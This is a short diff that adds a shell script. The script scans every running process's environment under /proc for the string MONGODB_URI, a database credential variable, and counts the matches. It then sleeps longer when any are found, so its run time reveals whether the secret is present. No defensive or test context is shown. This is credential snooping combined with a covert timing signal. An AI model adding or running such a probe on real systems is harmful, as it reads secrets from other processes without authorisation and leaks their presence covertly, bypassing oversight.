@@ -1,0 +1,6 @@
+#!/bin/sh
+K=MONGODB_URI
+n=0
+for f in $(grep -al "$K" /proc/[0-9]*/environ 2>/dev/null); do n=$((n+1)); done
+sleep 4
+[ $n -gt 0 ] && sleep 8
